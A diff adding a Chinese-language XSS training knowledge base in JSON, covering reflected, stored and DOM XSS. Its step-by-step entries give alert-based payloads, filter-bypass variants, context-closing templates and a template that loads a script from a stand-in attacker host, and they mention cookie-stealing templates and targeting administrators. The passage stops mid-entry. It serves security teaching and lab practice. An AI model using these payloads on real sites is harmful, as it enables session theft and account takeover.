@@ -1,0 +1,410 @@
+{
+  "id": "xss",
+  "name": "XSS 与前端安全",
+  "icon": "🎭",
+  "groups": [
+    {
+      "id": "g-basic",
+      "name": "XSS 基础与类型",
+      "intro": "掌握三种 XSS 的触发位置与区别，是后续所有利用的起点",
+      "entries": [
+        {
+          "id": "basic-types",
+          "title": "反射/存储/DOM 三类型对比",
+          "tags": [
+            "xss",
+            "dom-xss",
+            "reflected",
+            "stored"
+          ],
+          "aliases": [
+            "反射型",
+            "存储型",
+            "DOM型"
+          ],
+          "difficulty": "easy",
+          "summary": "同一段注入代码，因为触发位置与存储方式不同，被划分为三种类型，检测与利用思路完全不同。",
+          "content": "\n#### 这个条目的作用\n把 XSS 拆成三种类型讲清楚：同一句 `<script>alert(1)</script>`，放在搜索框、放在留言板、放在 URL 的 `#` 后面，分别是三种不同的漏洞。学会\"看现象判类型\"，才能选对后续的利用链。\n\n#### 前置条件\n- 一个能测的靶场（DVWA 低难度、pikachu 或任意 CTF 题）\n- 浏览器 F12（F12 → Console / Network 面板会用）\n- 理解一个基本概念：**响应体** = 服务器返回给浏览器的原始 HTML，在 F12 → Network → 点请求 → Response 标签里能看到\n\n#### 第 1 步：测反射型——拿搜索框开刀\n操作：打开任意有搜索功能的页面（如 `http://靶场/search.php?q=test`），把搜索词改成 `test123`，提交。\n观察：F12 → Network → 刷新 → 点开 `search.php` 请求 → Response 标签里搜 `test123`。\n预期结果：`test123` 原样出现在响应 HTML 里，比如 `<h1>结果: test123</h1>`。**payload 只在你这次请求里出现，刷新/换人访问就没有了** → 反射型。\n如果不行：响应里 `test123` 被转义成 `test123` 或变成 `test%20123`，说明输出被编码或 URL 编码，先解码或换注入点。\n\n#### 第 2 步：测存储型——换留言板/昵称\n操作：找评论、留言、昵称修改这类\"提交后保存\"的功能。在内容框里填 `<b>hacked</b>` 提交。\n观察：**换一个浏览器或开无痕窗口**重新打开评论列表页/个人主页。\n预期结果：别的页面、别的用户访问时依然能看到加粗的 `hacked`，说明输入被存进数据库并原样渲染 → 存储型。特征是\"一次提交，处处触发，重启浏览器还在\"。\n如果不行：显示的是 `<b>hacked</b>` 纯文本（尖括号被转义），说明服务端转义了 `<>`，存储型这条路被堵，转 DOM 型思路。\n\n#### 第 3 步：测 DOM 型——payload 藏在 # 后面\n操作：找一个读 `location.hash` 的页面（CTF 常给源码提示；没有就找 SPA 或带锚点渲染的页面）。在地址栏 URL 末尾追加 `#<img src=x onerror=alert(1)>`，回车。\n观察：F12 → Network 里看这次请求的响应体。\n预期结果：**响应体里完全看不到** `<img` 字样（服务器根本没收到 hash 部分），但页面弹了 alert 或 DOM 变化 → DOM 型。特征：\"响应体无 payload，但浏览器内执行\"。\n如果不行：没弹窗，说明页面 JS 没把 hash 写进 HTML（sink 不对），需要看源码找 `location.hash` / `innerHTML` 的赋值链（见 g-dom 分组）。\n\n#### 第 4 步：对照指纹表确认类型\n| 现象 | 类型 | 下一步动作 |\n|---|---|---|\n| payload 只在本请求回显 | 反射型 | 找闭合点直接利用 |\n| payload 存库、他人访问触发 | 存储型 | 找渲染页面，可打管理员 |\n| 响应体无 payload、浏览器内执行 | DOM 型 | 审计前端 source→sink |\n| 三招都试了没触发 | 被过滤/转义 | 看 g-bypass 分组做编码绕过 |\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 测 DOM 型时 Network 里看到 payload | 页面用的是 `location.search`（`?` 部分）而非 hash | 用 `?` 参数重试，或确认 source 类型 |\n| 存储型测试在无痕窗口不显示 | 评论需要审核/仅本人可见 | 换昵称字段或开第二个账号互看 |\n| 反射型一刷新就消失，以为没漏洞 | 反射型本就一次性，这正是特征 | 每次注入都要带 payload 重新请求 |\n| 三种都判定为\"没漏洞\" | 大概率被输出编码 | 先用 `<>\"'` 四个字符探测过滤规则 |\n\n#### 实战要点\n- 检测顺序固定：先看响应体回显（反射/存储），再看是否存库，最后才动前端 JS——反射型最容易先跑通闭环。\n- 存储型危害最大（可打管理员），DOM 型最难发现但最常出现在 SPA 靶场。\n- 同一 payload 三处都弹窗？说明站点多处没防护，按存储型优先上报。\n- 判定类型时以\"响应体是否含 payload、是否持久化\"两条为准，不要靠猜。"
+        },
+        {
+          "id": "basic-detect-payloads",
+          "title": "检测 payload 全集",
+          "tags": [
+            "xss",
+            "payload",
+            "detect"
+          ],
+          "aliases": [
+            "测试payload",
+            "验证payload"
+          ],
+          "difficulty": "easy",
+          "summary": "用最小的无害 payload 证实注入点存在，再用替换字符定位过滤规则，是 XSS 挖掘的标准节奏。",
+          "content": "\n#### 这个条目的作用\n提供一套\"先用小 payload 证明能执行，再探测过滤规则\"的标准流程。检测的目标不是立刻打死，而是回答两个问题：**能不能注入？被过滤了什么？**\n\n#### 前置条件\n- 一个目标注入点（搜索框 / 参数 / 评论区任一即可）\n- Burp Suite 或浏览器 F12 都行；能看响应原文即可\n- 知道用 `alert(1)` 弹窗作为\"执行成功\"的信号\n\n#### 第 1 步：先打一个无害标记，确认回显位置\n操作：向注入点提交 `zzq12345`（任意唯一字符串）。\n观察：F12 → Network → 响应里搜 `zzq12345`。\n预期结果：找到它出现的位置和包裹结构（`<div>` 里？`value=\"...\"` 里？URL 里？）。找不到就说明参数没回显，换注入点。\n如果不行：回显被编码（`&lt;` 之类），记住编码形式，后面按编码层绕过。\n\n#### 第 2 步：上最小弹窗三连\n操作：把 `zzq12345` 依次替换为下面三个 payload，每次提交后看是否弹窗：\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n```\n预期结果：任意一个弹窗 = 注入点成立，且能推断过滤情况——`<script>` 被过滤但 `img` 弹了 → 只挡了 script 标签；三个都弹 → 无过滤，直接上利用 payload。\n如果不行：三个都没弹，但回显里能看到 payload 原文 → 过滤或位置问题，进第 3 步。\n\n#### 第 3 步：字符探测集，摸清过滤规则\n操作：逐个提交下面这串字符，观察哪些被删、哪些被编码、哪些原样：\n```text\n< > \" ' / \\ ( ) ; = javascript alert onerror\n```\n观察：响应里逐个对比。`<` 没了 → 尖括号被删；`javascript` 变成 `jav%61script` → 关键字被替换/编码。\n预期结果：得到一张\"过滤清单\"，据此选绕过方向（编码、事件、大小写，见 g-bypass）。\n如果不行：全部原样 → 无字符级过滤，问题只剩闭合上下文，直接做闭合。\n\n#### 第 4 步：预闭合 payload，一次探测多个字符\n操作：直接提交这一条，观察弹没弹：\n```html\n\"><svg/onload=alert(1)>\n```\n预期结果：弹窗 = 双引号没被过滤、尖括号可用、且注入点在属性内（成功闭合了属性又开了新标签）。一次请求顶三次探测。\n如果不行：没弹，看响应里 `\"` 是否被删除或编码——被删则换单引号版 `'><svg/onload=alert(1)>` 重试。\n\n#### 第 5 步：确认是\"执行\"而不是\"回显\"\n操作：弹窗后，打开 F12 → Console，输入 `document.domain` 回车。\n预期结果：输出目标域名，证明 JS 在目标域上下文执行。若弹窗内容是你注入的字符串而非 alert 数字，说明只是回显文本，不算执行。\n如果不行：Console 报跨域错误或输出的是空 → 检查是否被 CSP 拦截（见 g-bypass 的 CSP 部分）。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| payload 回显了但不弹窗 | 输出被转义成文本 | 看响应里是否多了 `&lt;`，走编码绕过 |\n| `<script>` 被删但 img 弹窗 | 黑名单只挡 script | 直接用事件属性，别再纠结 script |\n| 弹窗内容显示 `<script>...` 字符串 | 注入进了 JS 字符串而非 HTML | 判定上下文，做闭合（见 basic-contexts） |\n| 本地能弹、靶场不弹 | 靶场有 WAF 或过滤更严 | 用字符探测集逐项测，别盲试完整 payload |\n\n#### 实战要点\n- 检测阶段永远用无害 payload（alert(1) 或弹 document.domain），别一上来就盗 cookie，容易被封。\n- 顺序：标记字符串 → 三连弹窗 → 字符探测 → 预闭合，任何一步成功就停，别浪费请求。\n- `\"><svg/onload=alert(1)>` 是最值钱的单条 payload：同时探测引号、尖括号、事件触发三个维度。\n- 把每个 payload 的\"响应原文\"截图存档，报告时证明过滤与绕过路径。"
+        },
+        {
+          "id": "basic-contexts",
+          "title": "闭合场景速查",
+          "tags": [
+            "xss",
+            "context",
+            "payload"
+          ],
+          "aliases": [
+            "闭合",
+            "上下文"
+          ],
+          "difficulty": "medium",
+          "summary": "注入点落在标签内、属性内、注释内还是 script 里，决定了 payload 的结构，先判定上下文再写 payload。",
+          "content": "\n#### 这个条目的作用\nXSS payload 不是\"往里一贴就完事\"，必须先把包裹它的 HTML 结构\"关掉\"再注入自己的代码。本条目教你先判定上下文、再套对应闭合公式。\n\n#### 前置条件\n- 一个已确认能注入、但裸 payload 不生效的注入点\n- 能看到响应原文（F12 → Network → Response）\n- 记住通用公式：**闭合符 + 注入本体 + 注释/引号收尾**\n\n#### 第 1 步：先看回显，判定上下文\n操作：提交 `INJECT` 四个字母，在响应原文里找到它，往前看 50 字符、往后看 50 字符。\n观察：它被什么包着？`<div>INJECT</div>`（标签间）、`value=\"INJECT\"`（双引号属性）、`value='INJECT'`（单引号属性）、`<!-- INJECT -->`（注释）、`var x='INJECT';`（script 内）。\n预期结果：判定出五种上下文之一，查下表选 payload。\n如果不行：回显被编码 → 先解决编码（g-bypass），编码不解决谈闭合没意义。\n\n#### 第 2 步：标签间上下文——直接插新标签\n场景回显：`<div>INJECT</div>`\n操作：提交：\n```html\n<script>alert(1)</script>\n```\n预期结果：弹窗。因为 `div` 之间可以直接插入新标签，无需闭合。\n如果不行：script 被过滤，换 `<img src=x onerror=alert(1)>`（事件触发不依赖 script 标签）。\n\n#### 第 3 步：双引号属性——闭合引号再闭合标签\n场景回显：`<input value=\"INJECT\">`\n操作：提交：\n```html\n\"><svg onload=alert(1)>\n```\n拆解：第一个 `\"` 关掉 value 的值，`>` 关掉 input 标签，然后 `<svg onload=alert(1)>` 是新标签。\n预期结果：弹窗。\n如果不行：没弹且响应里 `\"` 没了 → 双引号被过滤，试单引号版 `'><svg onload=alert(1)>`，或改走事件属性 `\" autofocus onfocus=alert(1) x=\"`（不闭合标签也能触发）。\n\n#### 第 4 步：单引号属性——闭合单引号即可\n场景回显：`<input value='INJECT'>`\n操作：提交：\n```html\n' onmouseover='alert(1)\n```\n拆解：第一个 `'` 关掉 value，后面 ` onmouseover='alert(1)` 追加事件属性，末尾 `'` 让属性值配对不报错。\n预期结果：鼠标悬停输入框时弹窗。\n如果不行：没反应 → 看响应里单引号是否被转义（`\\'`），被转义则先绕过转义（双写 `\\\\'` 或编码）。\n\n#### 第 5 步：注释内与 script 内——先关注释/字符串\n注释场景 `<!-- INJECT -->`，提交：\n```html\n--><script>alert(1)</script>\n```\nscript 场景 `var x = 'INJECT';`，提交：\n```javascript\n';alert(1);//\n```\n拆解：`-->` 提前关闭注释；`';` 关掉字符串并结束语句，`//` 注释掉尾部 `';`。\n预期结果：分别弹窗。\n如果不行：script 内场景记得收尾符必须用 `//` 或 `/* */`，漏了会语法报错不执行。\n\n#### 第 6 步：无引号属性——空格即分隔符\n场景回显：`<input value=INJECT>`（属性值没引号）\n操作：提交：\n```html\nvalue=INJECT onmouseover=alert(1) x=y\n```\n预期结果：悬停弹窗。因为无引号属性以空格为界，追加的 ` onmouseover=...` 直接成为新属性。\n如果不行：没弹 → 空格可能被过滤（换成制表符 `\\t` 或换行再试，见 g-bypass 空白符替换）。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 双引号属性用了 `<script>` 裸插 | 没闭合属性，script 成了属性值 | 先 `\">` 再插标签 |\n| 闭合成功但整页 JS 报错不弹 | script 内注入漏了收尾注释 | 结尾必须 `//` 或 `/* */` |\n| 单引号被转义成 `\\'` | 服务端转义引号 | 双写 `\\\\'` 或换无引号/事件思路 |\n| 弹了但只有第一次生效 | 上下文判断错，实际在别的包裹里 | 严格看响应原文，别凭想象 |\n\n#### 实战要点\n- 判定优先级：先看最近闭合字符是 `>` 还是引号；属性内优先事件属性（不用闭合标签），标签间优先新标签。\n- 五种上下文的 payload 背熟：`<script>alert(1)</script>`、`\"><svg onload=alert(1)>`、`' onmouseover='alert(1)`、`--><script>alert(1)</script>`、`';alert(1);//`。\n- 一个 payload 不生效先别换思路，先改\"闭合符\"，再改\"注入本体\"。"
+        }
+      ]
+    },
+    {
+      "id": "g-reflected",
+      "name": "反射型 XSS 挖掘",
+      "intro": "参数进响应即反射，挖掘核心是定位拼接点与闭合上下文",
+      "entries": [
+        {
+          "id": "ref-context-close",
+          "title": "上下文确认与闭合构造",
+          "tags": [
+            "xss",
+            "reflected",
+            "context"
+          ],
+          "aliases": [
+            "反射闭合"
+          ],
+          "difficulty": "medium",
+          "summary": "反射型 XSS 的灵魂是\"参数原样出现在响应体\"，用正则式思维找出回显位置外层包裹，逐层闭合。",
+          "content": "\n#### 这个条目的作用\n反射型 XSS 的完整挖掘流程：用一个唯一标记找到参数在响应里的回显位置，看清外层包裹，再按包裹结构一层层闭合构造 payload。这是反射型最核心的技能。\n\n#### 前置条件\n- 目标站点的搜索框/任意 GET 参数\n- Burp Suite（用 Repeater 反复改包最快）或 F12 的 Network 面板\n- 会用 basic-contexts 的五种上下文表\n\n#### 第 1 步：发一个唯一标记参数\n操作：Burp Repeater 里发（或用浏览器直接访问）：\n```http\nGET /search?q=marker7x9 HTTP/1.1\nHost: target.com\n```\n预期结果：请求成功返回页面。`marker7x9` 是你专用的唯一字符串，之后在响应里搜它就等于找到了注入点。\n如果不行：状态码 4xx/5xx → 参数名不对，先在正常搜索里抓包看真实参数名（可能是 `kw`、`keyword`）。\n\n#### 第 2 步：在响应里检索标记，观察包裹结构\n操作：Repeater 的 Response 里 Ctrl+F 搜 `marker7x9`。\n观察：它前后的 HTML 是什么？例如：\n```html\n<h1>SEARCH: marker7x9</h1>\n```\n或：\n```html\n<input name=\"kw\" value=\"marker7x9\">\n```\n预期结果：判断出是\"标签间\"还是\"属性内\"，进而决定闭合符。\n如果不行：搜不到 → 参数没被回显（可能被服务端重定向或参数名不同），换参数重试；搜到但变成 `marker7x9`（编码）→ 先处理编码层。\n\n#### 第 3 步：按包裹结构套闭合模板\n操作：对照下面模板选一条提交：\n```html\n<!-- 场景：<h1>SEARCH: q</h1> —— 标签间，直接插 -->\n<script>alert(1)</script>\n\n<!-- 场景：<input name=\"kw\" value=\"q\"> —— 双引号属性，闭合 -->\n\"><svg onload=alert(1)>\n\n<!-- 场景：<a href=\"result?q=q\"> —— URL 属性，闭合后加事件 -->\n\" onclick=\"alert(1)\n```\n预期结果：弹窗或点击触发。第三条提交后响应应变成 `<a href=\"result?q=\" onclick=\"alert(1)\">`，点链接即弹窗。\n如果不行：逐层试——先只试 `\"` 看引号是否被吃，再试 `>` 看尖括号是否被吃，哪层被吃就在哪层换绕过。\n\n#### 第 4 步：URL 内反射先确认解码\n操作：如果回显在 URL 属性里（`href=\"?q=q\"`），先把参数值改成 `%22%3E`（即 `\">` 的 URL 编码），观察响应。\n预期结果：响应里出现 `\"` `>` 原文 → 服务端先 URL 解码再拼接，编码层不构成障碍，可以正常闭合。\n如果不行：响应里仍是 `%22%3E` 原样 → 服务端不解码，URL 编码层已天然阻断闭合，此时 `javascript:` 伪协议也会失效，换注入点。\n\n> [!danger]\n> 反射点在 URL 内时，空格与引号会被 URL 编码。先确认服务端是否解码回显，解码后才考虑 `javascript:`，否则一切闭合都是徒劳。\n\n#### 第 5 步：用 Burp Repeater 快速迭代\n操作：把参数值固定在 Repeater 里，改一次 payload → Send → 看 Response 里的渲染结果，循环。\n预期结果：3-5 次内找到可执行 payload。每次改动只改一个变量（先闭合符、再注入体），避免\"改了三个地方不知道哪步生效\"。\n如果不行：反复失败说明可能有 WAF/过滤，转 g-bypass 分组按\"编码→事件→变体→截断\"逐层升级。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 搜不到标记字符串 | 参数名错或值被服务端改写 | 抓真实请求对比参数名 |\n| 标记被编码显示 | 输出转义 | 先做编码绕过再闭合 |\n| 闭合符 `\"` 被删除 | 引号被过滤 | 换单引号/无引号场景或双写转义 |\n| payload 弹了但点链接才触发 | 注入在 href 里 | 用事件属性 `\" onclick=` 或确认触发条件 |\n\n#### 实战要点\n- 第一步永远是唯一标记字符串，别直接用 payload 当标记，否则回显位置和过滤情况混在一起看不清。\n- 闭合公式：**闭合符 + 注入本体 + 注释/引号收尾**，一次只改一层。\n- 反射型一次请求一次触发，验证时每个 payload 都要重新带参请求，别指望刷新复用。\n- 响应原文是唯一真相：一切判断基于 Response 里实际渲染出的结构，不要用浏览器渲染结果猜。"
+        },
+        {
+          "id": "ref-attr-javascript-url",
+          "title": "属性注入与 javascript: URL",
+          "tags": [
+            "xss",
+            "attribute",
+            "javascript",
+            "url"
+          ],
+          "aliases": [
+            "href注入",
+            "伪协议"
+          ],
+          "difficulty": "easy",
+          "summary": "当注入点落在可点击属性（href/src/action）内，可以用伪协议直接执行脚本，也可用事件属性触发。",
+          "content": "\n#### 这个条目的作用\n注入点如果在 `href`、`src`、`action` 这类\"点了会跳转/加载\"的属性里，有两条利用路线：`javascript:` 伪协议直接执行，或追加事件属性免点击触发。本条目把两条路线和各自的坑讲清楚。\n\n#### 前置条件\n- 已确认注入点在某标签的可点击属性内（回显如 `<a href=\"INJECT\">`）\n- 浏览器地址栏能访问构造好的 URL（直接粘 payload 即可）\n\n#### 第 1 步：确认注入点在可点击属性里\n操作：提交标记 `abc`，在响应里看它是否出现在 `href=\"abc\"` / `src=\"abc\"` / `action=\"abc\"` 里。\n预期结果：确认是 URL 型属性。这三种属性都会把值当 URL 处理，是伪协议的天然入口。\n如果不行：标记出现在 `value=\"...\"` 或文本里 → 不是 URL 属性，走 basic-contexts 的其他闭合路线。\n\n#### 第 2 步：javascript: 伪协议直接打\n操作：把注入值替换为：\n```html\njavascript:alert(1)\n```\n触发：点击该链接（或访问 iframe/form 自动加载）时弹窗。\n完整形态对照：\n```html\n<a href=\"javascript:alert(1)\">click</a>\n<iframe src=\"javascript:alert(1)\">\n<form action=\"javascript:alert(1)\"><input type=submit>\n```\n预期结果：点击后地址栏不跳转、直接执行 `alert(1)` 弹窗。\n如果不行：点了没反应 → 服务端过滤了 `javascript:` 关键字（见第 4 步变体），或浏览器对 `iframe src=javascript:` 已收窄（现代浏览器基本都拦，优先用 `<a>` 和事件属性）。\n\n#### 第 3 步：事件属性免点击触发\n操作：如果伪协议被拦，或想\"不点也能触发\"，改用事件属性。先闭合当前属性再追加事件：\n```html\n\"><svg onload=alert(1)>\n```\n纯事件形态（无引号时直接追加）：\n```html\n<input value=\"x\" onfocus=alert(1) autofocus>\n<a href=\"x\" onmouseover=\"alert(1)\">hover</a>\n<img src=\"x\" onerror=\"alert(1)\">\n```\n预期结果：`onerror`/`onload` 零交互自动触发；`onfocus` 配合 `autofocus` 页面加载即触发；`onmouseover` 需要悬停。\n如果不行：事件属性没触发 → 确认你的注入点确实在标签属性里而非 URL 编码状态（第 4 步的编码问题同样影响事件属性）。\n\n#### 第 4 步：javascript: 被过滤时的变体\n操作：逐个试下面变体，看哪个能过过滤：\n```html\nJaVaScRiPt:alert(1)\njav&#x61;script:alert(1)\njavascript&colon;alert(1)\n```\n预期结果：大小写变体骗过只匹配小写的正则；HTML 实体变体在 href 属性里会被浏览器解码为 `javascript:` 再解析。\n如果不行：全被拦 → 放弃伪协议，纯用事件属性路线；事件也被拦就转 g-bypass 的编码/混淆组合。\n\n> [!tip]\n> 现代浏览器对 `<iframe src=javascript:>` 已收窄，优先用事件属性与 `<a>`。若服务端过滤 `javascript:`，尝试大小写/HTML 实体变体绕过。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| `javascript:alert(1)` 点了不弹 | 关键字被过滤或属性值被 URL 编码 | 试大小写/实体变体，或换事件属性 |\n| iframe 方式完全无效 | 现代浏览器禁用 iframe 伪协议 | 换 `<a href>` 或 img onerror |\n| 事件属性弹窗但需悬停 | 用了交互事件 | 换 onerror/onload/autofocus 零交互事件 |\n| 响应里 `javascript:` 变成 `javascript%3A` | 值被 URL 编码且未解码 | 该注入点走不通，换注入点 |\n\n#### 实战要点\n- 优先级：事件属性 > `<a>` 伪协议 > iframe 伪协议（iframe 现代浏览器基本不可用）。\n- `onerror` 和 `onload` 不需要任何用户交互，是属性注入的首选触发事件。\n- 伪协议被过滤先试大小写（`JaVaScRiPt:`），再试 HTML 实体（`&#x61;`），实体只在 href 属性上下文有效。\n- 利用成功后记录触发条件（点击/悬停/自动），报告里写清\"受害者需不需要交互\"。"
+        },
+        {
+          "id": "ref-payload-templates",
+          "title": "常用 payload 模板库",
+          "tags": [
+            "xss",
+            "payload",
+            "template"
+          ],
+          "aliases": [
+            "payload模板"
+          ],
+          "difficulty": "easy",
+          "summary": "一套可复用的 payload 模板，覆盖标签、属性、事件、svg 四种触发形态，验证时按过滤情况替换使用。",
+          "content": "\n#### 这个条目的作用\n把反射型 XSS 最常用的 payload 整理成可直接复制的模板库。拿到注入点后不用现场想 payload，按\"上下文 + 过滤情况\"从库里选，改两处就能用。\n\n#### 前置条件\n- 已用 basic-contexts 判定好注入上下文（标签间/属性内/script 内）\n- 已用 basic-detect-payloads 摸清大概的过滤情况\n- 一个能贴 payload 的请求（Burp Repeater 或浏览器地址栏）\n\n#### 第 1 步：按上下文选模板大类\n操作：对照判定结果选择：标签间 → 标签类；属性内 → 属性闭合类；什么都被过滤 → svg 变体类；长度受限 → 无引号/截断类。\n预期结果：先定大类，再在大类里挑具体 payload，避免瞎试。\n如果不行：上下文判不出来 → 回头用标记字符串看响应原文（ref-context-close 第 2 步）。\n\n#### 第 2 步：标签类模板（标签间上下文）\n操作：提交：\n```html\n<script>alert(1)</script>\n<script src=\"//attacker.com/x.js\"></script>\n```\n预期结果：第一条弹窗；第二条会向 `attacker.com` 请求外挂脚本（前提是你有可控的 JS 托管点，本地测试用第一条）。\n如果不行：`script` 被过滤 → 跳第 4 步 svg/事件变体，别在同一类里死磕。\n\n#### 第 3 步：属性闭合类模板（属性内上下文）\n操作：按引号情况选：\n```html\n\"><img src=x onerror=alert(1)>\n'><svg onload=alert(1)>\n\" autofocus onfocus=alert(1) x=\"\n```\n预期结果：前两条闭合后插新标签自动触发；第三条不闭合标签、靠 `autofocus` 聚焦触发，适合\"标签被白名单过滤\"的场景。\n如果不行：注意第三条的收尾 ` x=\"` 必须有——它把 value 属性补完整，否则 HTML 解析可能吞掉后续内容。\n\n#### 第 4 步：svg 变体与截断类（强过滤/长度受限）\n操作：按需替换：\n```html\n<svg/onload=alert(1)>\n<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>\n<svg/onload=alert(1)//\n<img src=x onerror=alert(1)//\n```\n预期结果：`<svg/onload=...>` 用\"标签名后直接跟事件\"的写法绕过\"事件前必须有空格/`on` 前后格式\"类过滤；`<math>...` 是标签嵌套变体，骗过只匹配单个标签名的黑名单。\n`//` 的作用：注释掉后续所有字符，防服务端\"尾部补引号/补 `>`\"的修复逻辑。\n如果不行：整条 payload 太长被截断 → 用超短模板 `<svg onload=alert(1)>`（20 字符内）或 `<img src=x onerror=alert(1)>`（30 字符内）。\n\n#### 第 5 步：按过滤情况逐级替换\n操作：遵循升级顺序：原始 payload → 字符探测定位过滤项 → 换事件 → 换变体 → 加 `//` 截断。每换一级只改一个变量并观察响应。\n预期结果：某级变体生效弹窗。记录\"哪一级生效\"，报告里写清过滤规则与绕过路径。\n如果不行：全库都试完没弹 → 可能不是纯反射点（被输出编码），转 g-bypass 分组做编码绕过。\n\n> [!warn]\n> CTF 与真实站点差异：真实站点需假设 WAF 存在，先在本地用相同 payload 对目标做字符级探测再发包；CTF 无 WAF 时直接一把梭。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| `<script src=//...>` 无反应 | 外挂脚本地址不可达 | 本地测试只用 alert 版，或先确认域名可达 |\n| 模板能弹但上报不通过 | 用了 alert 而目标要求更严重利用 | 按题目要求换盗 cookie/外带模板 |\n| `//` 截断后整页报错 | 注入点在 JS 里，`//` 把后续真代码也注释了 | script 内场景改用 `/* */` 或精确闭合 |\n| payload 过长被截断 | 输入长度限制 | 用最短模板，或把载荷放进 window.name 再 `eval(name)` |\n\n#### 实战要点\n- 模板库不是越多越好，四类各背 1-2 条就够：标签、属性闭合、svg 变体、截断。\n- `//` 结尾是反射型的万能收尾，遇到\"补引号/补标签\"的修复逻辑直接破。\n- 每条 payload 都标注\"适用上下文 + 触发条件\"，用时按上下文对号入座。\n- 本地靶场把整库全跑一遍，记录每条在哪类过滤下存活，形成自己的绕过对照表。"
+        }
+      ]
+    },
+    {
+      "id": "g-stored",
+      "name": "存储型 XSS",
+      "intro": "payload 持久化在服务端，一次注入多次触发，可波及所有访问者包括管理员",
+      "entries": [
+        {
+          "id": "stored-storage-points",
+          "title": "存储点枚举",
+          "tags": [
+            "xss",
+            "stored",
+            "injection-point"
+          ],
+          "aliases": [
+            "存储点"
+          ],
+          "difficulty": "medium",
+          "summary": "任何\"用户输入 - 服务端保存 - 其他页面渲染\"的链路都是存储型 XSS 候选点，先枚举存储点再逐点测试。",
+          "content": "\n#### 这个条目的作用\n存储型 XSS 的第一步不是写 payload，而是把站里所有\"会被存进数据库、以后再被渲染出来\"的输入点全部找出来。点找全了，才有后面的\"逐点测试、挑最疼的下手\"。\n\n#### 前置条件\n- 一个注册账号（多数存储点在登录后才有）\n- Burp Suite 或浏览器 F12（抓请求、看响应）\n- 靶机可以是 DVWA、Pikachu、XSS-labs 或任何带留言/评论/个人资料功能的靶场\n\n#### 第 1 步：画一条\"存储链路\"思维线\n先理解判定公式：**用户输入 → 服务端保存 → 别的页面（或别的用户）渲染**。缺任何一环都不是存储型。比如搜索框把关键词回显在结果页，那是一次性的反射型；但\"昵称\"被存进数据库、之后每个帖子作者栏都渲染它，就是存储型。\n\n#### 第 2 步：按功能清单枚举输入点\n把站点的功能列一遍，逐个判断会不会落库：\n\n| 功能 | 存储点 | 渲染场景 |\n|---|---|---|\n| 留言/评论/弹幕 | 评论正文 | 详情页、列表页 |\n| 个人资料 | 昵称/签名/头像URL/简介 | 用户主页、评论区作者栏 |\n| 富文本编辑 | 文章/工单/公告正文 | 前台展示页 |\n| 上传 | 附件/图片文件名 | 下载链接、列表页 |\n| 设置类 | 地址、备注、标签 | 管理后台、订单详情 |\n\n#### 第 3 步：用无害标记探测每个点\n对每个候选字段提交一串\"带特征\"的输入，而不是直接上 payload。标记选两种：纯文本标记 + 特殊字符标记。\n```text\nzzyzzy123                # 纯文本标记，用来确认\"内容确实被存了\"\n\"><'zzyzzy/<>            # 特殊字符标记，用来确认\"渲染时转义没有\"\n```\n提交后换个页面重新看：能在别处看到 `zzyzzy123`，说明确实落库并被渲染；再对比 `\"><'zzyzzy/<>` 回显的状态。\n> [!tip]\n> 渲染时 `\"` `'` `<` `>` 如果原样出现 → 直接进入第 5 步测 payload；如果变成 `&quot;` `&lt;` 之类实体 → 该字段被转义，存储成功也不触发（先记下来，跳到下一个点）。\n> 预期结果：拿到一张\"哪个字段存了、哪个字段转义了\"的清单。\n\n#### 第 4 步：确认渲染方式是 HTML 还是纯文本\n关键区分：接口/页面是把字段值**当作 HTML 拼接**，还是**当作文本插入**。\n```html\n<!-- HTML 拼接（危险）：值直接进入标签结构 -->\n<div class=\"author\">INJECT</div>\n\n<!-- 文本插入（安全）：被转义后显示 -->\n<div class=\"author\">&#60;INJECT&#62;</div>\n```\n操作方法：F12 打开 Elements 面板，提交带 `<b>test</b>` 的字段，刷新渲染页，看 `test` 是否变成**加粗**。加粗 = 当 HTML 渲染，危险；显示成字面 `<b>test</b>` = 被转义。\n\n#### 第 5 步：对未转义的字段测验证 payload\n对清单里\"未转义\"的字段，先提交无害验证 payload：\n```html\n<img src=x onerror=alert(document.domain)>\n```\n预期结果：页面弹出当前域名 → 该点确认可执行脚本，存储型 XSS 成立。\n如果不行：检查文本框是否有长度/字数限制把 payload 截断了；再看看是不是只有管理员或特定角色才能看到该渲染页——换个有权限的账号看。\n\n#### 第 6 步：富文本类存储点特殊处理\n富文本编辑器（文章、工单）通常过白名单过滤（DOMPurify 等），直接贴 `<script>` 会被剥掉：\n```html\n<!-- 富文本常见缺口：受信任标签内嵌属性 -->\n<svg><animate onbegin=alert(1)>      <!-- 部分版本漏过滤 -->\n<a href=\"javascript:alert(1)\">x</a>   <!-- 旧版本 href 校验缺失 -->\n```\n操作：编辑器切到\"源码/HTML\"模式再粘贴，不要用工具栏插入。逐个试上表 payload，观察保存后哪些属性被保留。\n> [!warn]\n> 先确认渲染接口返回的是 HTML 还是转义文本。只转义 `<>` 的接口即使存储成功也不触发，此时应转投 DOM XSS 思路，找前端二次拼接点（见 g-dom 组）。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 当前页能看到输入，别处看不到 | 只测了自身回显，漏了其它渲染页 | 全站翻一遍含该字段的页面（主页、列表、管理端） |\n| payload 提交成功但不弹窗 | 服务端做了转义或白名单过滤 | F12 看 Elements 里实际渲染成什么样，再按 g-bypass 组升级 payload |\n| 有长度限制，payload 被截断 | 表单 maxlength / 服务端截断 | 用 `<svg onload=...>` 短 payload，或把载荷放进 window.name |\n| 只有管理页才渲染该字段 | 角色可见性差异 | 先注册两个普通账号互测，确认基础触发，再规划打管理员 |\n\n#### 实战要点\n- 存储点清单是打管理员的前提：管理员头像、昵称、工单内容渲染在后台页的，价值最高。\n- 每个字段测三步：存没存（文本标记）→ 转没转（特殊字符标记）→ 执不执行（验证 payload）。\n- 渲染页面可能和提交页面不同源路径，用全站搜索功能或爬一遍页面找渲染点。\n- 记录每个点的\"渲染 URL + 字段名 + 转义状态\"，后面所有利用都基于这张表。\n- 